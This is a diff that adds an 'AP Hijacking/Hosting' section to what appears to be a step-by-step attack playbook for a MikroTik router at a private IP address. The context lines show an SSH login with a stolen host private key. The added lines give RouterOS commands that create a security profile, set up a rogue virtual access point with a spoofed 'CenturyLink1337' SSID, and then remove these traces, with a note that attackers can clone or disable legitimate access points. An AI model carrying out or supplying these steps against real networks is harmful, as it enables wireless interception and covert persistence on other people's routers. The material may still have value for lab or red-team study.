@@ -326,5 +326,20 @@ Target: `http://172.16.0.1:55511`
         - Attempt the ssh `ssh admin@172.16.0.1 -i ../ssh_host_private_key`
         - PWN!
         > NOTE: Not only does it give the central key, but it also generates the `dsa`, `admin` and the `ssh_host_private_key`.
-    
-    
+
+* **13. AP Hijacking/Hosting**
+    * **13.1 List Current Interfaces**
+        - `interface wireless print`
+        - `interface wireless security-profiles print`
+        - `interface wireless bridge print`
+        - `interface wireless registration-table print`
+    * **13.2 Create A Security Profile**
+        - `interface wireless security-profiles add authentication-types=wpa-psk mode=dynamic-keys wpa-pre-shared-key="..." name="www" comment="MikroTik WPA Security Supplement."`
+    * **13.3 Add The Virtual AP Interface** 
+        - `interface wireless add name="MikroTikAP" master-interface=wlan1 mode=ap-bridge ssid="CenturyLink1337" security-profile=www disabled=no`
+        > NOTE: Here is an essential attack vector, where an attacker can clone other access points, disable the current ones, or have one completly seperate for more centralized operations. 
+    * **13.4 Sanitize** _Nuclear Option_
+        - `interface bridge port [find interface=www]` Remove the port.
+        - `interface wireless remove [find name="MikroTikAP"]` Remove the AP.
+        - `interface wireless security-profiles remove [find name=www]` Remove the Security Profile.
+
